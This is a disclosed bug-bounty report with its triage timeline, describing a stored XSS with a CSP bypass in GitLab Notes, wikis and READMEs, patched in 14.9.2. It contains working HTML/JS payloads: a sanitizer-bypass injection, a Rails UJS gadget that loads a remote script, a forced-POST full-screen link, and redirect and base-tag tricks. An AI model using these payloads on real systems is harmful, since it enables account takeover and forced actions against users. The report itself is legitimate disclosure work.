---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
date: 2022-05-25
submitted: 2022-02-14T20:54:27.751Z
bounty_usd: null
votes: 161
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "joaxcar"
source: "https://hackerone.com/reports/1481207"
title: "Stored XSS in Notes (with CSP bypass for gitlab.com)"
---
# Stored XSS in Notes (with CSP bypass for gitlab.com)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 161 | **Program:** GitLab | **Disclosed:** 2022-05-25

- Report: [https://hackerone.com/reports/1481207](https://hackerone.com/reports/1481207)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2022-02-14T20:54:27.751Z

## Timeline

- **Report Filed**
- **2022-02-15** @joaxcar: A quick note:
To make the attack more consistent (as the asset hashes seems to change) I added a `.htaccess` file to my web server redirecting all requests to my `hack.js` file containing `alert(document.domain)`. The `.htaccess` file content
```
RewriteEngine on
RewriteCond %{REQUEST_URI} !^/hack.js$
RewriteRule .* /hack.js [L,R=302]
```
So now you can use the tag
```
<base href=https://joaxcar.com>
```
In your payload for quick tests. The redirection is also allowed by CSP
- **2022-02-15** @h1_analyst_caesar: Hi @joaxcar,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@turtle_shell
- **Report Severity Updated**
- **Report Pending Program Review**
- **2022-02-16** @joaxcar: Thank you for looking at the report @turtle_shell 

Another quick insight in what is going on.

I was quite confused that the `base` tag worked as it is not allowed by DOMPurify which is used for sanitation of the GFM. But I now realized that this sanitation happens in JavaScript. This is AFTER the page have loaded with the raw HTML from the Note. At least this is what I think is happening.

What this means is that ALL JavaScript is valid for a split second, but most of the dangerous parts are blocked by CSP. But If you try this payload (in a issue description, and make sure not to use quotations in the payload as that will break the injection) on a self hosted server everything will run
```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<img src=# onerror=alert(1)>
<script>alert(2)</script>
<iframe srcdoc='<script>alert(3)</script>' />
<meta http-equiv=refresh content='5;https://joaxcar.com/hack.js'>
<pre x=&#34;">
<code></code></pre>
```
I will get back with a short description about injection contexts in GitLab. But If you enter this in an issue description and saves it you will notice that only two of the three popups occur, and then the redirect due to the `meta` tag.

But If you instead create a user named `user_1` and with that user creates a __public__ project `user_1` and in this project enters this payload in the `README.md` file. This will add this README as a "personal description" on the user page https://gitlab.example.com/user_1 and if visiting this page all three popups will occur and also the redirect.

If you skip the redirection and instead just inject the script tags, you will see that they all fire, but after the site is completely loaded the sanitation will have taken effect and the script and iframe tags are removed. The onerror tag is also gone.

As I said, these three simple vectors are all blocked by CSP on gitlab.com. The meta redirection does work on the main site as well and can turn any GitLab page containing MD to an open redirect. But as the injection actually can contain any HTML/JS any valid CSP bypass would work, such as my ` base` tag one.

I will come back with two more working POCs that bypasses CSP restrictions on GitLab.com later
- **2022-02-17** @joaxcar: Update again that might help with understanding how this report differs from [1398305](https://hackerone.com/reports/1398305) and why I think It should count as a valid bypass of the current fix.

The old report showed how [syntax_highlight_filter.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/c2e5d7b89b84cc5b44575592bb706ef75c3d1bbb/lib/banzai/filter/syntax_highlight_filter.rb) could be abused in `Notes` ([documentation](https://docs.gitlab.com/ee/api/notes.html))

> Notes are comments on:
>
>   Snippets
>    Issues
>    Merge requests
>   Epics

And as it turns out when using this as an injection in Notes the transferred data does seem to sanitize the input before putting it in the DOM. Thus, another bypass like the `Emoji` one was needed (it has to survive DOMPurify). What I have described above occurs when the `syntax_highlight_filter` is abused in Markdown in for example `.md` files such as `README.md` or in descriptions of `issues` or `projects`. Here the payload is delivered in the initial response from the server and sanitized AFTER added to the DOM.

Maybe it is time for my "short" explanation of injection contexts in GitLab :) even if the report is not triaged yet

## HTML injections in GitLab
There are three stages during rendering of GitLab web pages where an injection could occur.

1. Injections that are delivered as __part of the initial HTML__ from the request. Usually added by some `.rb` or `.haml` files. An example is the main body of an `Issue` page.
2. Injections that are delivered as __part of a subsequent request__. For example, `Comments` on an `Issue`. These are added to the DOM after initial load.
3. Injections made by JavaScript __in response to actions made by the user__. Clicking the "Preview" button when writing a comment. Or in the error message generated on a bad request.

(this is sometimes a simplification as seen in my example of the difference in `issue` descriptions and `user README` as the former actually get the data in a JS object in the DOM and not as plain HTML. Even if booth are in the first category)

These three stages behaves differently and are subject to different type of attacks. There are also two subtypes of these injections.

__a.__ Non sanitized data
__b.__ Sanitized data, usually by DOMPurify but sometimes Rails.sanitize

This particular injection touches on multiple of these levels. As shown by the initial `Emoji` payload, there existed a payload that survived sanitation and that was able to execute in stage 2 from above (being injected post load of main page). The payload i have shown above works as the data is delivered in the main response and was not sanitized.

If the injected payload is sanitized the attacker need to rely on script gadgets found in GitLab javascript soure code. My report [1409788](https://hackerone.com/reports/1409788) showcased how an injection in stage 2 that was sanitized through DOMPurify. And as I showed, this could still lead to arbitrary POST requests made as the victim user (leading to admin creation or user takeover).

## Gadgets
I know of script gadgets that effect both stage 1 and 2 (I have not found any gadget that works for stage 3). They all originates from the [main.js](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/main.js) file loaded when any page on gilab is loaded. This file contains two main parts

* The main body of the file, executed directly on load of the GitLab page response.
* A deferred function call to `deferredInitialisation` which is deferred with `requestIdleCallback`

As I have shown in my previous report, the deferred function contains at least two dangerous calls abusing the fact that arbitrary `data-*` tags are allowed in DOMPurify and that `style` tags and attributes are not stripped. This is fixed locally for my other report, but still open anywhere else where an injection would occur. This vector is not a full XSS but dangerous and is not blocked by CSP.

The main body of the `main.js` file contains another (quite powerful) gadget in the `GLFieldErrors` see line
```javascript
$('.gl-show-field-errors').each((i, form) => new GlFieldErrors(form));
```
Which end up running these lines in [gl_field_error.js](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/gl_field_error.js)
```javascript
    this.errorMessage = this.inputElement.attr('title') || __('This field is required.');
    this.fieldErrorElement = $(`<p class='${errorMessageClass} hidden'>${this.errorMessage}</p>`);
    ...
    errorAnchor.after(this.fieldErrorElement);
```
This gadget is only usable in stage 1 and thus not reachable in `comments` or `Notebooks` as they render in stage 2. A minimal payload for this gadget looks like this (using [Rails ujs payload](https://gitlab.com/gitlab-org/gitlab/-/issues/336138))
```html
<form class=gl-show-field-errors>
<input type=text title="&lt;a data-remote=true data-method=get data-type=script style='background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: fixed; top: 0; width: 100%; z-index: 1000' href=https://gitlab.com/joaxcar_group/first/-/jobs/1415515489/artifacts/raw/data/alert.js&gt;.&lt;/a&gt;&lt;p&gt;"/></form>
```
The initial payload is accepted by DOMPurify as it only contains the elements `form` and `input`, and uses the tags `class` `type` and `title`. The payload stored in the `title` is not subject to sanitation after added to the DOM, so there everything is fine. The Rail Ujs payload is used here as it bypasses CSP on gitlab.com

## Arbitrary POST requests and "DOS" of issues and MRs
Well, what I want to prove here is that GitLab at the moment is at risk of injection attacks (that also bypasses CSP) even if user data is sanitized by the current DOMPurify settings. It also adds to this report as we can now get back to analyzing these `Notes` which seemed to be patched. We know that they are loaded in stage 2 (and thus even if we could inject the `form`+`input` payload the script will not hit our injection) so the same arbitrary POST from my previous report can be used here.

```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<div class='js-new-user-signups-cap-reached' data-dismiss-endpoint='https://gitlab.com/api/v4/users/9228512/follow' data-defer-links='true' data-feature-id='1'>
<a href='https://joaxcar.com/hack.js' class='js-close deferred-link' style='background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: fixed; top: 0; width: 100%; z-index: 1000'>
    hack
</a>
</div>
<pre x=&#34;">
<code></code></pre>
```

This payload works in comments and other `notes`. It will create a full screen link, that when clicked will make a POST request (this time to follow `joaxcar`) and then redirect the user to `https://joaxcar.com/hack.js`.

This adds to the initial report, as this makes it possible to add "impact to the availability of a resource" as of CVSS. As the user can go to any public project (say gitlab-org/gitlab) and post this payload as a comment on any issue or MR and thus rendering the page unusable (__and turning it into an arbitrary POST attack AND an open redirect!__)

## Another XSS vector
To prove the gadget using field errors you have to have the payload delivered in the initial response. This can be archived by adding it to a Wiki page. Create a new wiki page and enter (for this to work we need to add `</p>PAYLOAD<p>` to not have the error hidden and not clickable)
```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<form class=gl-show-field-errors>
<input type=text title=&#34;&lt;/p&gt;&lt;a data-remote=true; data-method=get data-type=script style='background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: fixed; top: 0; width: 100%; z-index: 1000' href=https://gitlab.com/joaxcar_group/first/-/jobs/1415515489/artifacts/raw/data/alert.js&gt;.&lt;/a&gt;&lt;p&gt;&#34;/></form>
<pre x=&#34;">
<code></code></pre>
```
Then reload the page. It will cover the screen with a link that when clicked will load a script from the GitLab domain and bypassing CSP again. This time the injection is left in the DOM as the payload is DOMPurify safe!

{F1622267}

## Conclusion
That was a mouthful. Sorry, if this is too much information, then just run with the initial report. I do think that the intricacies here are important

To properly defend against similar attacks in the future, you need to consider tightening up DOMPurify instance wide, and probably make some changes to the field error code. Also, the issue with payload getting delivered unsanitized to be sanitized in JS is a bit sketchy.

And I think that the CVSS (calculated with your calculator) should be closer to CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L (8.9) as there is High impact and High confidentiality as well as the possibility to "DOS" project issues and MRs.

But again its up to you! I just wanted to dig into it and might do a blog post sometime in the future, so thought I might as well share.

Best regards
Johan
- **2022-02-18** @joaxcar: My two cents on the question of bypass or duplicate are these: in the issue for the original XSS ([345657](https://gitlab.com/gitlab-org/gitlab/-/issues/345657)) there is a discussion about the reported issue being two bugs. And that maybe there should be another issue created for the HTML injection. From what I can see, there were no other issue created, and the original report got closed as fixed. GitLab making this issue public also points at this being considered "done".

For these reasons, I think this report should be considered a valid bypass to the fix and not a duplicate of it. I find it hard to believe that GitLab would make an ongoing XSS issue public if you know about it :)

(I don't know if it is possible, but you should probably consider making the previous issue confidential again)
- **2022-02-18** @ngeorge: @joaxcar,
Thank you for submitting the report and adding a detailed analysis. I will check on this report and get back to you as soon as possible.

Best regards,
Nikhil
- **Report Triaged**
- **2022-02-22** @joaxcar: Thanks again for looking into the report @ngeorge ! and for triage.

Looks like you made the original issue confidential again, which is great!

As a curiosity (to paint a complete picture of the injection stages) I can mention that the Rails Ujs attributes, that are blocked by DOMPurify since a couple of months back, __did__ work as an XSS vector in what I called "stage 3". This was before the ujs data attributes were stripped during sanitation. As they are stripped by v-html-safe (using DOMPurify) they are now not really useful as an XSS vector if not bundled up in another injection as I showed above.

But they work as an example on how XSS could creep into stage 3 as well, if there is JS code that monitors changes in the DOM and react to it. Such as using `new MutationObserver()`  (see user_popovers.js). This could add XSS injection paths at this stage as well.

I have been looking around to elevate my report [1362405](https://hackerone.com/reports/1362405) but have not found anything usefull after the block of ujs..

Thanks again and glad to help If you have any questions or when you want to retest the fix!

Best regards
Johan
- **2022-02-24** @gitlab-securitybot: ETA for fix:

Hi @joaxcar,

The issue you reported is currently scheduled to be fixed by 2022-03-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Bounty Awarded**
- **2022-03-17** @gitlab-securitybot: ETA for fix:

Hi @joaxcar,

The issue you reported is currently scheduled to be fixed by 2022-04-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2022-04-01** @joaxcar: H again @ngeorge , glad to see the fix being deployed in 14.9.2!

I have a small question regarding CVSS and impact. I know that XSS is one of those issues that vary greatly from program to program when it comes to assessed impact. GitLab takes them really serious (as you should) and gives valid reports with CSP bypass  HIGH in confidentiality impact and HIGH on Integrity impact. I think that this is correct, at least as long as XSS's are able to generate access tokens and thus access and modify everything short from passwords on the effected accounts, even bypassing 2FA.

My question this time concerns the parameter "availability". All XSS's can of course be said to have some limited impact on availability, on the page they are fired. But I would like to point out that this impact can vary greatly.

I reported an XSS last year, putting the payload in an MR approval rule. The integrity and confidentiality impact of this is the same, as there are many ways to trick a user to visit the effected site, but the attack could not be leveraged broadly on the platform due to privilege restrictions and the positioning of the payload. On the other hand the issue reported here can (as I have shown) be used, with limited XSS effect but impactful availability effect, to target the availability of other users projects. By dropping the payload in comments on issues and MRs in a victim's project, it will effectively DOS any public work on the platform. This is due to the payload being able to be placed in issue/mr discussion notes, user front page, and wikis. The effect here should at least correspond to the patched DOS issues (CVE-2022-1099 and CVE-2022-1174) with low availability impact from the same 14.9.2 patch.

Even if you keep the bounty amount on the same level, it would help maintainers to differentiate between the XSS issues with a broad scope and the more restricted ones when assessing risks in patch maintenance. 

I have already gotten two questions on twitter DM from maintainers asking me if the two reported issues are related. I have not manager to reproduce the other one so I can't tell if it has the same effect on availability or not.

Long story short, I think that you should add an availability impact of LOW whenever the XSS vector can be used "offensively" on other users projects. It will still keep XSS in HIGH overall impact (8.9 instead of the 8.7 it has now) but it will help differentiate the reports. 

Best regards
Johan
- **Report Resolved**
- **Bounty Awarded**
- **2022-04-04** @joaxcar: Hi @vdesousa . Thanks for an amazing bounty!

Glad to see that GitLab chose to include XSS on par with other vulnerabilities in the new award rating system. Even if it is a "simple issue" the impact in GitLab is still high, and It is great that you show that you take it seriously!

It feels a bit greedy to point to my comment above regarding CVSS. I am not asking to increase the bounty amount, but I am still curious about the "accessibility" part of some XSS vectors. I have now successfully recreated the other XSS (reference_redactor) in the same patch  and from what I can see this issue could also be used in an offensive way, DOSin MRs and Issues. So If you could elaborate on why these issues have a lower "availability impact" than a "malformed diagram in notes" It would be great.

(As mentioned previously, it would be to distinguish these "offensive" XSS vectors from more "localized" ones such as my previous reports from "approval rule name" and similar)

Otherwise, again, huge thanks!

Johan
- **2022-04-04** @vdesousa: Hi @joaxcar ,

Apologies for not replying to your previous comment. I will discuss your suggestion with the team.

The reason we were not considering `A:L` is because while the UI is not loaded completely, the user can still quickly go away by just clicking on another link. We usually consider valid DoS attacks that can effectively put down a GitLab instance and not just a user interface not loading.

Hope it helps,
Best regards,
Vitor
GitLab Security Team
- **Agreed On Going Public**
- **2022-05-25** @joaxcar: Hi again @vdesousa sorry for a ping after only 5 days, but saw that it was @ngeorge who triaged this in the beginning, maybe that is the correct user to reach out to. Just thought that it would be fun to get another report disclosed prior to the AMA.

Best regards
Johan
- **Agreed On Going Public**
- **Report Became Public**
- **2022-05-25** @joaxcar: Thanks for disclosing @ngeorge !
Thought it might be worth noting that this was patched with a CVSS of `CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N, 8.7` and not 7.6 as stated here in H1. To explain the bounty amount to anyone reading the report.

/Johan
- **Report Severity Updated**
